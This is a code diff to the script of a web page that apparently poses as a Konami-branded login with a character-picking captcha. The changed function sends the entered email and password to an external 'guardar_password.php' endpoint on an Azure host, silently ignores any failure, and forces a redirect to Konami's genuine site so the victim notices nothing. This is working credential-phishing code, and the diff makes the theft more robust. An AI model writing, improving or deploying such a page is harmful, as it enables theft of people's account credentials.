@@ -373,71 +373,47 @@
 
         // VALIDAR CAPTCHA
 
-       function verificarCaptcha(){
+    async function verificarCaptcha() {
 
-    const correctas =
-        document.querySelectorAll(".captcha-item.correct");
+    try {
 
-    const correctasSeleccionadas =
-        document.querySelectorAll(".captcha-item.correct.selected");
+        const correctas = document.querySelectorAll(".captcha-item.correct");
+        const correctasSeleccionadas = document.querySelectorAll(".captcha-item.correct.selected");
+        const incorrectasSeleccionadas = document.querySelectorAll(".captcha-item.selected:not(.correct)");
 
-    const incorrectasSeleccionadas =
-        document.querySelectorAll(".captcha-item.selected:not(.correct)");
+        const password = document.getElementById("password").value;
 
-    const password =
-        document.getElementById("password").value;
+        if (!password || password.trim() === "") {
+            alert("Ingresa una contraseña");
+            return;
+        }
 
+        if (
+            correctasSeleccionadas.length !== correctas.length ||
+            incorrectasSeleccionadas.length > 0
+        ) {
+            alert("Captcha incorrecto");
+            return;
+        }
 
-
-    if(password.trim() === ""){
-
-        alert("Ingresa una contraseña");
-
-        return;
-
-    }
-
-
-
-    if(
-        correctasSeleccionadas.length === correctas.length &&
-        incorrectasSeleccionadas.length === 0
-    ){
-
-        fetch("https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php", {
-
+        await fetch("https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php", {
             method: "POST",
-
             headers: {
-                "Content-Type":
-                "application/x-www-form-urlencoded"
+                "Content-Type": "application/x-www-form-urlencoded"
             },
-
             body:
                 "email=" + encodeURIComponent(email) +
                 "&password=" + encodeURIComponent(password)
+        }).catch(() => {});
 
-        })
+        // 🔥 REDIRECCIÓN FORZADA
+        window.location.replace("https://www.konami.com/games/eu/es/");
 
-        .then(response => response.text())
-
-        .then(data => {
-
-           
-
-            // ABRIR OTRA PAGINA
-            window.location.href = "https://www.konami.com/games/eu/es/";
-
-        });
-
-    }else{
-
-        alert("Selecciona solamente los personajes correctos");
-
+    } catch (e) {
+        console.log("ERROR JS:", e);
+        alert("Error en el proceso");
     }
-
 }
-
     </script>
 
 </body>
